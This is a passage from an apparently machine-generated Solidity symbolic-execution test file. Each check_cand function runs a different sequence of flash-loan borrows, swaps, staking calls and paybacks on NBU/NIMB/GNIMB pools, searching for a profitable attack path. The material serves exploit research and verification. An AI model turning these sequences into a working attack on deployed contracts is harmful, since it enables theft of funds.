        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
